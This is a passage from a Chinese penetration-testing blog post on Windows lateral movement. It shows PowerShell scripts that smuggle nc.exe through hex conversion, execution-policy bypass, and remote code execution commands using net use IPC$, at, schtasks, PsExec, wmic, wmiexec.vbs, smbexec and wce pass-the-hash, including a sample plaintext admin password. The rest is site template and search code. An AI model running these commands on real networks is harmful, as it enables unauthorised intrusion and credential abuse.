+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[byte[]] <span class="variable">$hexdump</span> = <span class="built_in">get-content</span> -encoding byte -path <span class="string">"nc.exe"</span></span><br><span class="line">[System.IO.File]::WriteAllLines(<span class="string">"nc.txt"</span>,([string]<span class="variable">$hexdump</span>))</span><br></pre></td></tr></table></figure>
+<p>text2exe.ps1</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[String]<span class="variable">$hexdump</span> = <span class="built_in">get-content</span> -path <span class="string">"nc.txt"</span></span><br><span class="line">[Byte[]] <span class="variable">$temp</span> = <span class="variable">$hexdump</span> -split <span class="string">' '</span></span><br><span class="line">[System.IO.File]::WriteAllBytes(<span class="string">"shell2.exe"</span>,<span class="variable">$temp</span>)</span><br></pre></td></tr></table></figure>
+<p>执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass -File .\exe2text.ps1</span><br><span class="line">powershell -ExecutionPolicy Bypass -File .\text2exe.ps1</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fqic8ihhopj30hs09oq2q.jpg" alt=""></p>
+<h4 id="利用csc-exe编译源码"><a href="#利用csc-exe编译源码" class="headerlink" title="利用csc.exe编译源码"></a>利用csc.exe编译源码</h4><p>csc.exe存在路径为(依版本不同路径有细微差别)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csc.exe /out:C:\1.exe C:\1.cs</span><br></pre></td></tr></table></figure>
+<h4 id="利用debug的hex功能将hex"><a href="#利用debug的hex功能将hex" class="headerlink" title="利用debug的hex功能将hex"></a>利用debug的hex功能将hex</h4><p><strong>文件转换为exe文件</strong></p>
+<p>debug只有server 2003才有</p>
+<p>利用思路：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">把需要上传的exe转成16进制</span><br><span class="line">通过echo命令将16进制数据写入文件（每次写入的长度有限制）</span><br><span class="line">使用debug功能将16进制还原exe文件</span><br></pre></td></tr></table></figure>
+<p>l3m0n师傅给出了一个<code>debug_nc_file.bat</code>，运行这个文件就能写入1.dll、123.hex、nc.exe</p>
+<h3 id="远程连接、代码执行"><a href="#远程连接、代码执行" class="headerlink" title="远程连接、代码执行"></a>远程连接、代码执行</h3><h4 id="at-amp-schtasks"><a href="#at-amp-schtasks" class="headerlink" title="at&amp;schtasks"></a>at&amp;schtasks</h4><p>查看所有连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure>
+<p>开启一个ipc$连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.120.67\ipc$ 密码 /user:用户名</span><br></pre></td></tr></table></figure>
+<p>复制写入文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.bat \\192.168.120.67\c$</span><br></pre></td></tr></table></figure>
+<p>查看目标服务器时间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.120.67</span><br></pre></td></tr></table></figure>
+<p>添加at任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.120.67 8:00(8:00pm) \\192.168.120.67\c$\1.bat</span><br></pre></td></tr></table></figure>
+<p>查看添加的所有at任务列表，执行过的不能查看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.120.67</span><br></pre></td></tr></table></figure>
+<p>映射共享磁盘到本地</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use z: \\192.168.120.67\c$ 密码 /user:用户名</span><br></pre></td></tr></table></figure>
+<p>删除共享映射</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use * /del</span><br></pre></td></tr></table></figure>
+<p>删除连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.120.67 /del</span><br></pre></td></tr></table></figure>
+<p>需要注意的是需要开启tasks scheduler服务。如果at命令后提示找不到网络路径，则目标机器禁用了这个服务</p>
+<h4 id="pstools"><a href="#pstools" class="headerlink" title="pstools"></a>pstools</h4><p>这是微软官方的工具，有12款小工具。所有的pstool在第一次运行时都会有弹窗，但是可以用-accepteula参数绕过</p>
+<p>首先建立一个ip$连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.120.67 密码 /user:用户名</span><br></pre></td></tr></table></figure>
+<p>12款工具分别为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PsExec:远程执行进程</span><br><span class="line">PsFile:显示远程打开的文件</span><br><span class="line">PsGetSid:显示计算机或用户的sid</span><br><span class="line">PsInfo:列出有关系统的信息</span><br><span class="line">PsKill:按名称或进程ID终止进程</span><br><span class="line">PsList:列出有关进程的详细信息</span><br><span class="line">PsLoggedOn:查看在本地通过资源共享登录的用户</span><br><span class="line">PsLogList:转存时间日志记录</span><br><span class="line">PsPasswd:更改账户密码</span><br><span class="line">PsService:查看和控制服务</span><br><span class="line">PsShutdown:重启机器</span><br><span class="line">PsSuspend:暂停进程</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqkd7spfhfj30hw05l3yb.jpg" alt=""></p>
+<h4 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h4><p>net use建立ipc连接后，可以利用wmic命令来执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.120.67 密码 /user:用户名</span><br><span class="line">copy 1.txt \\192.168.120.67\c$\windows\temp\1.txt</span><br><span class="line">wmic /node:192.168.120.67 /user:用户名 /password：密码 process call create c:\window\temp\1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fqkdj5e6ydj30hu09h743.jpg" alt=""></p>
+<h4 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h4><p>半交互模式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript //nologo wmiexec.vbs /shell ip 用户名 密码</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fqkdmfdfwtj30hu04q3ya.jpg" alt=""></p>
+<p>单命令执行（一次只能执行一次命令）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs /cmd ip 用户名 密码 &quot;命令&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqkdpqtm2hj30hv07zt8j.jpg" alt=""></p>
+<p>wce_hash注入</p>
+<p>据说wce是与gethashes和mimikatz齐名的一款hash管理工具</p>
+<p>如果抓取的LM hash是AAD3开头，或No password之类的，就用32个0代替LM hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wce.exe -s 用户名:对方机器名或者ip:LM-HASH:NTLM-HASH</span><br></pre></td></tr></table></figure>
+<p>但是抓不到LM抓不到，不知道该怎么利用</p>
+<p>在08上能抓到LM，可以利用</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqkfy9oejyj30hv0663yc.jpg" alt=""></p>
+<p>另外柠檬师傅提到wmi只是创建进程，不能判断一个进程是否执行完成，这样导致wmi.dll不能删除，下一次执行的时候会提示被占用，这时只用修改vbs脚本里的名字就行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Const FileName = &quot;wmi1.dll&quot;</span><br></pre></td></tr></table></figure>
+<p>也可以在后台运行，加入-persist参数即可</p>
+<h4 id="smbexec可以根据其他共享来获取一个cmd"><a href="#smbexec可以根据其他共享来获取一个cmd" class="headerlink" title="smbexec可以根据其他共享来获取一个cmd"></a>smbexec可以根据其他共享来获取一个cmd</h4><p>先把execserver.exe复制到目标的windows目录下，接着在本机执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.exe ip 用户名 密码 命令 分析名</span><br></pre></td></tr></table></figure>
+<p>具体步骤为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.120.67\ipc$ Luoxuan6721. /user:administrator</span><br><span class="line">copy execserver.exe \\192.168.120.67\c$\windows</span><br><span class="line">test.exe 192.168.120.67 administrator Luoxuan6721. whoami c$</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqkgobu24wj30hx09cdfn.jpg" alt=""></p>
+<h4 id="schtasks计划任务远程执行"><a href="#schtasks计划任务远程执行" class="headerlink" title="schtasks计划任务远程执行"></a>schtasks计划任务远程执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn 计划任务名 /tr 执行程序 /sc 执行选项 [/mo modifier] [/d day] [/s 主机] [/ru 用户名] [/st 时间]</span><br></pre></td></tr></table></figure>
+<p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn test /tr c:\1.exe /sc once /st 00:00:00 /s 192.168.120.67 /ru administrator</span><br><span class="line">schtasks /run /tn test /s 192.168.120.67</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqkkqdv9ixj30hv0500sj.jpg" alt=""></p>
+<h4 id="PTH-compmgmt-msc"><a href="#PTH-compmgmt-msc" class="headerlink" title="PTH+compmgmt.msc"></a>PTH+compmgmt.msc</h4><p>这个还没怎么搞懂，等py一波师傅再说</p>
+<hr>
+<p>路还很长</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------------这是我的底线-----------------------</div>
+    
+</div>
+
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/内网渗透/" rel="tag"><i class="fa fa-tag"></i> 内网渗透</a>
+          
+            <a href="/tags/远程操作/" rel="tag"><i class="fa fa-tag"></i> 远程操作</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/25/磨皮皮之hash抓取/" rel="next" title="磨皮皮之hash抓取">
+                <i class="fa fa-chevron-left"></i> 磨皮皮之hash抓取
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/04/28/内网三基佬之知根♂知底/" rel="prev" title="内网三基佬之知根♂知底">
+                内网三基佬之知根♂知底 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">spira1</p>
+              <p class="site-description motion-element" itemprop="description">路还很长，我的目标是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eagerseven@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#内网文件传输"><span class="nav-number">1.</span> <span class="nav-text">内网文件传输</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#powershell文件下载"><span class="nav-number">1.1.</span> <span class="nav-text">powershell文件下载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vbs脚本文件下载"><span class="nav-number">1.2.</span> <span class="nav-text">vbs脚本文件下载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bitsadmin命令"><span class="nav-number">1.3.</span> <span class="nav-text">bitsadmin命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件共享"><span class="nav-number">1.4.</span> <span class="nav-text">文件共享</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用telnet"><span class="nav-number">1.5.</span> <span class="nav-text">利用telnet</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用hta文件"><span class="nav-number">1.6.</span> <span class="nav-text">利用hta文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用perl脚本"><span class="nav-number">1.7.</span> <span class="nav-text">利用perl脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用python脚本"><span class="nav-number">1.8.</span> <span class="nav-text">利用python脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用ruby脚本"><span class="nav-number">1.9.</span> <span class="nav-text">利用ruby脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP脚本下载"><span class="nav-number">1.10.</span> <span class="nav-text">PHP脚本下载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wget文件下载"><span class="nav-number">1.11.</span> <span class="nav-text">wget文件下载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dns数据传输"><span class="nav-number">1.12.</span> <span class="nav-text">dns数据传输</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ftp文件传输"><span class="nav-number">1.13.</span> <span class="nav-text">ftp文件传输</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nc文件传输"><span class="nav-number">1.14.</span> <span class="nav-text">nc文件传输</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#smb文件传送"><span class="nav-number">1.15.</span> <span class="nav-text">smb文件传送</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件编译"><span class="nav-number">2.</span> <span class="nav-text">文件编译</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#利用powershell进行文件编译"><span class="nav-number">2.1.</span> <span class="nav-text">利用powershell进行文件编译</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用csc-exe编译源码"><span class="nav-number">2.2.</span> <span class="nav-text">利用csc.exe编译源码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用debug的hex功能将hex"><span class="nav-number">2.3.</span> <span class="nav-text">利用debug的hex功能将hex</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程连接、代码执行"><span class="nav-number">3.</span> <span class="nav-text">远程连接、代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#at-amp-schtasks"><span class="nav-number">3.1.</span> <span class="nav-text">at&amp;schtasks</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pstools"><span class="nav-number">3.2.</span> <span class="nav-text">pstools</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wmic"><span class="nav-number">3.3.</span> <span class="nav-text">wmic</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wmiexec-vbs"><span class="nav-number">3.4.</span> <span class="nav-text">wmiexec.vbs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#smbexec可以根据其他共享来获取一个cmd"><span class="nav-number">3.5.</span> <span class="nav-text">smbexec可以根据其他共享来获取一个cmd</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#schtasks计划任务远程执行"><span class="nav-number">3.6.</span> <span class="nav-text">schtasks计划任务远程执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PTH-compmgmt-msc"><span class="nav-number">3.7.</span> <span class="nav-text">PTH+compmgmt.msc</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">spira1</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
